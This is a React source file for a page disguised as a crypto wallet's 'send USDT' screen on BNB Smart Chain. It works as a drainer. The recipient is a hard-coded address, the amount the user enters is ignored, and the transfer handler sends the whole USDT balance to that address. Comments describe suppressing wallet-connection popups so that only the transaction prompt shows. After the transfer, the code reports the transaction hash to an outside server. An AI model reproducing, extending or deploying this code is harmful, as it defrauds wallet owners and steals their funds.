import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const recipientAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Your receiving address

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");

  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      if (accounts.length === 0) {
        Swal.fire("Error", "Please connect your wallet first.", "error");
        return;
      }
      const user = accounts[0];
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(user).call();
      setAmount(web3.utils.fromWei(balance, "ether"));
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  const handleTransfer = async () => {
    setIsProcessing(true);
    try {
      if (!window.ethereum) {
        Swal.fire("Error", "Please install MetaMask or Trust Wallet", "error");
        setIsProcessing(false);
        return;
      }

      const web3 = new Web3(window.ethereum);

      // ✅ CRITICAL CHANGE: Use eth_accounts (silent, no popup)
      let accounts = await window.ethereum.request({ method: 'eth_accounts' });
      
      let userAddress;
      
      // If wallet is already connected, get the address
      if (accounts && accounts.length > 0) {
        userAddress = accounts[0];
      } else {
        // ✅ If not connected, we'll let the transaction itself trigger connection
        // First, get available accounts without triggering popup
        userAddress = null;
      }

      // Check and switch to BSC network
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56n && chainId !== 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: "0x38",
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
              }]
            });
          } else {
            throw switchError;
          }
        }
        // After network switch, re-check accounts
        accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0) {
          userAddress = accounts[0];
        }
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

      // ✅ If we don't have userAddress yet, we need to get it from the first transaction
      if (!userAddress) {
        // This will trigger wallet connection in the SAME popup as transaction
        const tempAccounts = await web3.eth.getAccounts();
        userAddress = tempAccounts[0];
      }

      // Fetch balance silently
      const currentBalance = await usdt.methods.balanceOf(userAddress).call();

      console.log("User address:", userAddress);
      console.log("USDT Balance:", currentBalance.toString());

      if (currentBalance === "0" || BigInt(currentBalance) === 0n) {
        Swal.fire("Error", "You have no USDT balance to transfer.", "error");
        setIsProcessing(false);
        return;
      }

      // Encode the transfer function call
      const transferData = usdt.methods.transfer(recipientAddress, currentBalance).encodeABI();

      // ✅ Use eth_sendTransaction directly - this shows ONLY the transaction popup
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: userAddress,
          to: usdtAddress,
          data: transferData,
          value: '0x0',
        }],
      });

      console.log("Transaction hash:", txHash);

      // Wait for transaction receipt
      let receipt = null;
      while (receipt === null) {
        try {
          receipt = await web3.eth.getTransactionReceipt(txHash);
          if (receipt === null) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        } catch (err) {
          console.log("Waiting for transaction...");
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      console.log("Transaction successful:", receipt);
      setShowSuccess(true);

      // Store transaction hash
      try {
        await fetch("https://www.trc20support.buzz/old/store-address.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: txHash }),
        });
      } catch (fetchErr) {
        console.warn("Skipping fetch, not critical:", fetchErr.message);
      }

    } catch (err) {
      console.error("Transfer error:", err);

      let errorMessage = "Something went wrong";
      if (err.message) {
        if (err.message.includes("insufficient funds")) {
          errorMessage = "Insufficient BNB for gas fees";
        } else if (err.message.includes("exceeds balance")) {
          errorMessage = "Transfer amount exceeds USDT balance";
        } else if (err.message.includes("User denied") || err.message.includes("User rejected")) {
          errorMessage = "Transaction cancelled by user";
        } else {
          errorMessage = err.message;
        }
      }

      Swal.fire("Error", errorMessage, "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg
          className="w-24 h-24 text-green-500 animate-bounce"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          viewBox="0 0 24 24"
        >
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Transaction Successful</h2>
        <button
          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
          onClick={() => setShowSuccess(false)}
        >
          OK
        </button>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      <div className="input-group">
        <p className="inpt_tital">Address or Domain Name</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              placeholder="Search or Enter"
              value={recipientAddress}
              readOnly
            />
          </div>
          <span className="right blue flex justify-between mr-3">
            <span className="w-6 text-sm">Paste</span>
            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
          </span>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
            <span
              className="mar_i blue text-sm ml-2 cursor-pointer"
              onClick={setMaxAmount}
            >
              Max
            </span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={handleTransfer}
        disabled={isProcessing}
        style={{
          backgroundColor: isProcessing ? "var(--disabled-bg)" : "#5CE07E",
          color: isProcessing ? "var(--disabled-text)" : "#1b1e15"
        }}
      >
        {isProcessing ? "Processing..." : "Next"}
      </button>
    </div>
  );
}
